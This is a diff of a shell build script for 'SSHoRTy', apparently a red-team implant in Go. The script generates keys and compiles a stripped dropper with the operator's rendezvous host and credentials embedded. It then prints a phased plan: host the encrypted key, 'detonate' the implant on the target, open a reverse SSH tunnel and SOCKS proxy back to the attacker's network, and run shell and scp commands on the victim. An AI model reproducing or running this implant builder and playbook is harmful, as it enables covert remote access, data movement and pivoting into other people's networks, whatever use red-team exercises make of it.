@@ -25,19 +25,38 @@ fi
 export GOOS=${DropperOS} GOARCH=${DropperArch}
 
 TOP_DIR="/Users/dimas/Code/go/src/sshpipe"
+TOOL_DIR="${TOP_DIR}/tools"
 CODE_DIR="${TOP_DIR}/src"
-OUT_DIR="${TOP_DIR}/out"
+OUT_DIR="${TOP_DIR}/out/${ImplantID}"
 
-echo "[*] Building dropper for ${DropperOS} / ${DropperArch} "
+[[ ! -d ${OUT_DIR} ]] && mkdir ${OUT_DIR}
+cd ${TOP_DIR}
 
-go build -ldflags \
+printf "\n\n\t%s\n" "Cutting Implant ID ${ImplantID} for target (${DropperOS}/${DropperArch})"
+printf "\n%s\n" "### PHASE I:  Implant Generation ###"
+printf "%s\n\n" "------------------------------------"
+echo "[*] Building Keys For ${ImplantID} "
+
+go run ${TOOL_DIR}/keygen.go \
+       -bits 4096  -pass ${SSHServerUserKeyPassphrase} \
+       -pkfile ${SSHServerUserKeyFile}.pk \
+       -pkfile-b64 ${SSHServerUserKeyFile}.bpk \
+       -pubfile ${SSHServerUserKeyFile}.pub
+
+if [[ $? -eq 0 ]]
+then
+    echo
+    echo "[*] Building dropper ${ImplantID} (${DropperName}) for ${DropperOS} / ${DropperArch} "
+
+    go build -ldflags \
 	"-s -w \
+     -X main.ImplantID=${ImplantID}  \
      -X main.SSHShell=${SSHShell}  \
      -X main.SSHEnvTerm=${SSHEnvTerm}  \
      -X main.SSHServerPort=${SSHServerPort}  \
      -X main.SSHServerHost=${SSHServerHost} \
      -X main.SSHServerUser=${SSHServerUser} \
-     -X main.SSHServerUserKey=${SSHServerUserKey} \
+     -X main.SSHServerUserKey=$( cat ${SSHServerUserKeyFile}.bpk ) \
      -X main.SSHServerUserKeyUrl=${SSHServerUserKeyUrl} \
      -X main.SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase} \
      -X main.SSHRemoteCmdHost=${SSHRemoteCmdHost}  \
@@ -59,62 +78,114 @@ go build -ldflags \
             ${CODE_DIR}/rssh.go  ${CODE_DIR}/types.go ${CODE_DIR}/vars.go \
             ${CODE_DIR}/pty.go ${CODE_DIR}/socksport.go ${CODE_DIR}/keymgmt.go \
             ${CODE_DIR}/traffic.go
+else
+    printf "    %s\n" "KeyGen unsuccessful"
+    exit 2
+fi
 
 if [[ $? -eq 0 ]]
 then
-    printf "    %s\n" "########### SSHoRTy Implant Generated ############"
-    printf "    %s\n" "!!! Record the info below and keep it safe !!!"
 
-    printf "    %s\n" "Implant: ${DropperName} ($(stat -f '%z bytes' ${DropperName}))"
+printf "\n\n%s\n\n" "**********************************************"
+echo "Implant: ${DropperName} ($(stat -f '%z bytes' ${OUT_DIR}/${DropperName})) Generated"
+echo "!!! Here is the info on Implant configuraton !!!"
+echo "!!! Record the info somewhere safe !!!"
+echo "!!! This info is mostly embedded in the Implant. !!!"
+echo "!!! Again, save it, or you will need to regenerate the implant.!!!"
+printf "%s\n\n" "**********************************************"
 
-    printf "    \n%s\n" "::: (Yellow/Red) SSH Rendezvous Point :::"
-    printf "    %s\n" "SSHServerHost=${SSHServerHost}"
-    printf "    %s\n" "SSHServerPort=${SSHServerPort}"
-    printf "    %s\n" "SSHServerUser=${SSHServerUser}"
+printf "%s\n\n" "-------------- START INFO--------------"
+cat<<END
+(Blue) Implant Egress HTTP Proxy Info
+    +HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment}
+     HTTP Proxy: ${HTTPProxy}
+     HTTP Proxy AuthUser ${HTTPProxyAuthUser}
+     HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>}
 
-    printf "    \n%s\n" "::: (Yellow/Red) SSH Key Hosting / Embedding :::"
-    printf "    %s\n" "+SSHServerUserKeyFile=${SSHServerUserKeyFile}"
-    printf "    %s\n" " SSHServerUserKeyUrl=${SSHServerUserKeyUrl}"
-    printf "    %s\n" " SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}"
+(Blue) Implant Execution Context
+    Daemonize? ${Daemonize}
+    PIDFile: ${PIDFile}
+    LogFile (!! Debug locally !!): ${LogFile}
+    SSHEnvTerm ${SSHEnvTerm}
+    SSHShell ${SSHShell}
 
-    printf "    \n%s\n" "::: (Red) Operator SSH Tunnel to Implant :::"
-    printf "    %s\n" "SSHRemoteCmdHost=${SSHRemoteCmdHost}"
-    printf "    %s\n" "SSHRemoteCmdPort=${SSHRemoteCmdPort}"
+(Yellow/Red) Implant HTTP/WS/WSS Wrap Endpoints
+    HTTP Endpoint: ${HTTPEndpoint}
+    WS Endpoint: ${WSEndpoint}
 
-    printf "    \n%s\n" "::: (Red) Operator SSH Implant Auth :::"
-    printf "    %s\n" "SSHRemoteCmdUser=${SSHRemoteCmdUser}"
-    printf "    %s\n" "SSHRemoteCmdPwd=${SSHRemoteCmdPwd}"
+(Yellow/Red) SSH Rendezvous Point:
+    SSHServerHost=${SSHServerHost}
+    SSHServerPort=${SSHServerPort}
+    SSHServerUser=${SSHServerUser}
 
-    printf "    \n%s\n" "::: (Red) Operator SOCKS Tunnel :::"
-    printf "    %s\n" "SSHRemoteSocksHost=${SSHRemoteSocksHost}"
-    printf "    %s\n" "SSHRemoteSocksPort=${SSHRemoteSocksPort}"
+(Yellow/Red) SSH Key Hosting / Embedding:
+    +SSHServerUserKeyFile=${SSHServerUserKeyFile}.bpk
+    SSHServerUserKeyUrl=${SSHServerUserKeyUrl}
+    SSHServerUserKeyPassphrase=${SSHServerUserKeyPassphrase}
 
-    printf "    \n%s\n" "::: (Blue) Implant Egress HTTP Proxy :::"
-    printf "    %s\n" "+HTTP Proxy:(from env?) ${HTTPProxyFromEnvironment} "
-    printf "    %s\n" " HTTP Proxy: ${HTTPProxy} "
-    printf "    %s\n" " HTTP Proxy AuthUser ${HTTPProxyAuthUser} "
-    printf "    %s\n" " HTTP Proxy AuthPass ${HTTPProxyAuthPass+<masked>} "
+(Red) RT Operator Interface to SSH Implant Channel:
+    SSHRemoteCmdHost=${SSHRemoteCmdHost}
+    SSHRemoteCmdPort=${SSHRemoteCmdPort}
 
-    printf "    \n%s\n" "::: (Yellow/Red) Implant HTTP/WS/WSS Wrap Endpoints :::"
-    printf "    %s\n" "HTTP Endpoint: ${HTTPEndpoint} "
-    printf "    %s\n" "WS Endpoint: ${WSEndpoint} "
+(Red) RT Operator SSH Tunnel Usage and Authentication Info
+    SSHRemoteCmdUser=${SSHRemoteCmdUser}
+    SSHRemoteCmdPwd=${SSHRemoteCmdPwd}
 
+(Red) RT Operator SOCKS Tunnel Usage Info:
+    SSHRemoteSocksHost=${SSHRemoteSocksHost}
+    SSHRemoteSocksPort=${SSHRemoteSocksPort}
+END
 
-    printf "    \n%s\n" "::: (Blue) Implant Execution Context :::"
-    printf "    %s\n" "Daemonize? ${Daemonize} "
-    printf "    %s\n" "PIDFile: ${PIDFile} "
-    printf "    %s\n" "LogFile (!! Debug locally !!): ${LogFile} "
-    printf "    %s\n" "SSHEnvTerm ${SSHEnvTerm} "
-    printf "    %s\n" "SSHShell ${SSHShell} "
+printf "%s\n\n" "-------------- END INFO----------------"
+printf "\n\n%s\n\n" "**********************************************"
+echo "Based on your build profile you can expect the following Deployment Plan"
+printf "%s\n\n" "**********************************************"
 
-    printf "    \n%s\n" "#######################"
+printf "\n%s\n" "### PHASE II: Red Infra Prep Deployment Guidance ###"
+printf "%s\n\n" "----------------------------------------------------"
+cat<<END
+A. If you have chosen to fetch armored SSH key from external Yellow/Red hosting, please host  ${SSHServerUserKeyFile}.bpk on your HTTP server. The key is encrypted, passworded and B64 protected. You can leave it on clear storage and use plaintext transmission. The implant will take care of the rest.
 
-    printf "\n    %s\n" "   Usage SSH-RT: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} "
-    printf "    %s\n" "   Usage SSH-RTS: browser SOCKS proxy: ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} "
+B.You will need to create user ${SSHServerUser} on SSH server where you want Implant to terminate the reverse tunnel on Red network. Refer to scripts in infra directory. SSH keys for the would be user are pregenerated:  ${SSHServerUserKeyFile}.pk and  ${SSHServerUserKeyFile}.pub. You need to place them in .ssh directory as per usual SSH access setup (mind the permissions on keys and .ssh directory)
+
+C. You will need to stand up an WSS unwrap service on Yellow/Red side. Refer to scripts in infra directory or documentation.
+END
+
+printf "\n%s\n" "### PHASE III: Blue Detonation and Connect back ###"
+printf "%s\n\n" "---------------------------------------------------"
+cat<<END
+
+    0. Get the Implant on the Blue system detonate.
+    1. Implant ${ImplantID} connects to WS Endpoint ${WSEndpoint}
+        which unwraps to SSH tunnel ${SSHServerHost}:${SSHServerPort} Red rendezvous
+
+    2. Implant authenticates to SSH rendezvous with RSA PK in ${SSHServerUserKeyFile}.pk wrapped for transmission as ${SSHServerUserKeyFile}.bpk as SSH/OS user ${SSHServerUser}
+
+    3. Once authenticated the Implant opens up reverse SSH tunnel to Blue network and also stands up two ports on the Red side for convenience:
+        - SSH command port ${SSHRemoteCmdPort}
+        - SOCKS ${SSHRemoteSocksPort} port used for proxying Red traffic over the channel to the implant to exit on Blue network
+
+END
+
+printf "\n%s\n" "### PHASE IV: RTO Guidance ###"
+printf "%s\n\n" "-----------------------------------------------"
+cat<<END
+RTOs can connect to the new implant channel by connecting to Red rendezvous ports exposed by the implant on Red network.
+
+Examples:
+    For SSH interactive shell: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort}
+    For SSH batch exec: ssh ${SSHRemoteCmdUser}@${SSHRemoteCmdHost} -p ${SSHRemoteCmdPort} /path/command/on/blue
+    For SCP: scp -P ${SSHRemoteCmdPort} /path/to/file/on/red  ${SSHRemoteCmdUser}@${SSHRemoteCmdHost}:/path/to/file/on/blue"
+
+Note: To use SOCKS in browser point browser to ${SSHRemoteSocksHost}:${SSHRemoteSocksPort} or for system wide coverage use proxychains with the same configuration
+END
 else
-    printf "    %s\n" "Build unsuccessful"
-    exit 2
+    printf "    %s\n" "Implant build unsuccessful"
+    exit 3
 fi
+
+printf "%s\n" "-----------------End Transmission -----------------"
+printf "\n%s\n" "Good luck!"
 
 
 # upx --brute ./rssh
